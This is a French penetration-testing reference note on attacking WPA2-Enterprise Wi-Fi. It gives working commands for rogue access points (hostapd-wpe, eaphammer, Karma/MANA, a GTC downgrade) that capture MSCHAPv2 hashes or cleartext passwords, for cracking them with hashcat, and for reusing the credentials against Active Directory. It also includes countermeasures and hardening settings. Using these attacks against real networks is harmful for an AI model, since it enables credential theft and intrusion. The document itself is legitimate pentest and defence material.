---
title: "Attaques WPA2-Enterprise"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking > Network Security > WiFi"
tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, wpa2, enterprise, eaphammer, peap, mschapv2, karma]
date: "2026-05-17"
---

# Attaques WPA2-Enterprise

WPA2-Enterprise utilise **802.1X** : l'authentification est déléguée à un serveur RADIUS via **EAP**. Pas de PSK partagée — chaque utilisateur a ses propres credentials. Cible privilégiée en pentest entreprise.

## Architecture 802.1X / EAP

```
[Supplicant]        [Authenticator]         [Auth Server]
  Client       ←→        AP            ←→     RADIUS
                     802.1X (EAPoL)        RADIUS (UDP 1812)

  EAP Identity ----→
                  ----→ Access-Request
                        ←---- Access-Challenge
  ←---- EAP Challenge
  EAP Response ----→
                  ----→ Access-Request
                        ←---- Access-Accept
  ←---- EAP Success
```

## Méthodes EAP courantes

| Méthode | Authentification | Vulnérabilité |
|---------|------------------|---------------|
| EAP-MD5 | Mot de passe (challenge/response MD5) | Cassé, ne pas utiliser |
| LEAP | MSCHAPv1 (Cisco) | Cassé (asleap) |
| EAP-TLS | Certificat client + serveur | Robuste si bien configuré |
| EAP-PEAP / PEAPv0 | Tunnel TLS + MSCHAPv2 | Vulnérable si cert serveur non validé |
| EAP-TTLS | Tunnel TLS + (PAP/MSCHAPv2/...) | Idem PEAP |
| EAP-FAST | PAC (Protected Access Credential) | Configurable, parfois vulnérable |

**Cible n°1** : PEAP-MSCHAPv2 (par défaut sur Windows / Active Directory).

## Le défaut fondamental de PEAP-MSCHAPv2

1. Le client ouvre un tunnel TLS avec le serveur RADIUS
2. **Si le client ne valide pas le certificat serveur** → on peut présenter notre propre certificat
3. Le client envoie alors son hash MSCHAPv2 dans **notre** tunnel
4. MSCHAPv2 = NT-Hash en challenge/response → cassable offline (NetNTLMv1)

## Capture de credentials — hostapd-wpe

```bash
# Préparer la config
cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/wpe.conf
sed -i 's/^ssid=.*/ssid=Corporate-WiFi/' /tmp/wpe.conf
sed -i 's/^channel=.*/channel=6/' /tmp/wpe.conf

# Lancer
hostapd-wpe /tmp/wpe.conf

# Quand un client s'authentifie :
# mschapv2: Wed May 17 14:32:11 2026
# username:  alice@corp.local
# challenge: 11:22:33:44:55:66:77:88
# response:  c3:d2:e1:...:99
# jtr NETNTLM: alice:$NETNTLM$11223344556677$c3d2e1...

# Crack avec hashcat
hashcat -m 5500 hashes.txt rockyou.txt -r rules/best64.rule

# Ou asleap (plus rapide pour MSCHAPv2 court)
asleap -C 11:22:33:44:55:66:77:88 -R c3d2e1... -W rockyou.txt
```

## eaphammer — framework dédié

Plus complet que hostapd-wpe seul (Karma, GTC downgrade, attaques avancées).

```bash
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer && ./kali-setup

# Générer le certificat serveur (à imiter celui de la vraie infra)
./eaphammer --cert-wizard
# → CN = "RADIUS.corp.local", CA = "Corporate CA"

# Attaque PEAP-MSCHAPv2 standard
./eaphammer -i wlan0 \
  --essid Corporate-WiFi \
  --channel 6 \
  --auth wpa-eap \
  --creds

# Sortie dans loot/ avec hashes au format hashcat
hashcat -m 5500 loot/hostapd-wpe.log.creds rockyou.txt
```

### Karma / MANA via eaphammer

Répondre à toutes les **probe requests** des clients alentour pour les piéger.

```bash
# Karma classique (broadcast SSID demandé par les clients)
./eaphammer -i wlan0 \
  --auth wpa-eap \
  --creds \
  --karma

# MANA (variant : envoie probe response pour chaque SSID demandé)
./eaphammer -i wlan0 \
  --auth wpa-eap \
  --creds \
  --mana

# Loud-MANA (encore plus agressif, répond même à des probes broadcast)
./eaphammer -i wlan0 \
  --auth wpa-eap \
  --creds \
  --loud
```

### GTC Downgrade

Force le client à passer en **EAP-GTC** (Generic Token Card) qui transmet le **mot de passe en clair** dans le tunnel TLS.

```bash
./eaphammer -i wlan0 \
  --essid Corporate-WiFi \
  --auth wpa-eap \
  --creds \
  --negotiate gtc-downgrade

# Si la victime accepte → on récupère le mot de passe en clair
# (Souvent : Android, certains supplicants Linux mal configurés)
```

### EAP-TLS — vol de certificat client

Si le client utilise EAP-TLS, on ne peut pas récupérer le hash (pas de password). Mais on peut **capturer le client cert + key** si exporté sans protection (rare).

Plus réaliste : extraire le certificat depuis la machine compromise (Windows : `certutil`, registre HKLM\SOFTWARE\Microsoft\SystemCertificates\My`).

## Crack MSCHAPv2 — NETNTLM

```bash
# Format hashcat mode 5500
# username::challenge:response:challenge

# Crack basique
hashcat -m 5500 hash.txt rockyou.txt

# Avec règles
hashcat -m 5500 hash.txt rockyou.txt -r rules/d3ad0ne.rule

# Brute-force masqué (Corporate2024!, etc.)
hashcat -m 5500 hash.txt -a 3 ?u?l?l?l?l?l?l?l?l?d?d?d?d?s

# Le hash MSCHAPv2 = DES x 3 sur le NT-hash
# Avec un cluster GPU on peut bruteforce le NT-hash entier en ~24h (crack.sh)
# → ensuite cracker le NT-hash (mode 1000)
```

## Après le crack : pivoter dans l'AD

Le username/password Wi-Fi est souvent le **même que le compte Windows** (intégré AD).

```bash
# Validation via LDAP
ldapsearch -x -H ldap://dc.corp.local \
  -D "alice@corp.local" -w "P@ssword123" \
  -b "DC=corp,DC=local"

# Via SMB (validation rapide)
crackmapexec smb dc.corp.local -u alice -p 'P@ssword123' -d corp.local

# Si validé : énumération AD
crackmapexec ldap dc.corp.local -u alice -p 'P@ssword123' -d corp.local --users
```

→ Voir [[Responder]] pour la suite (NTLM relay, pivot).

## Détection / contre-mesures

| Mesure | Effet |
|--------|-------|
| **Valider le certificat serveur côté client** | Bloque hostapd-wpe / eaphammer (le supplicant rejette notre cert) |
| Imposer uniquement les AC entreprise dans le store | Bloque les certs auto-signés ou tiers |
| **EAP-TLS** (certificats clients) | Pas de password à capturer |
| Désactiver EAP-GTC dans la conf supplicant | Bloque le downgrade |
| Monitoring RADIUS (logs Access-Reject anormaux) | Détecte les tentatives massives |
| WIDS sur ESSID dupliqués | Alerte sur SSID Enterprise contrefait |
| **Disable Roaming aggressiveness** côté client | Réduit l'attractivité d'un AP rogue plus puissant |

### Configuration durcie Windows (GPO)

- `Validate server certificate` = activé
- `Connect to these servers` = `radius.corp.local`
- `Trusted Root Certification Authorities` = uniquement AC interne
- `Don't prompt user to authorize new servers or trusted certification authorities` = activé

## Voir aussi

- [[05 - Evil Twin et Phishing]] — hostapd-wpe en contexte
- [[Responder]] — pivot NTLM après crack des credentials
- [[08 - Frameworks Tout-en-Un]] — airgeddon gère aussi Enterprise
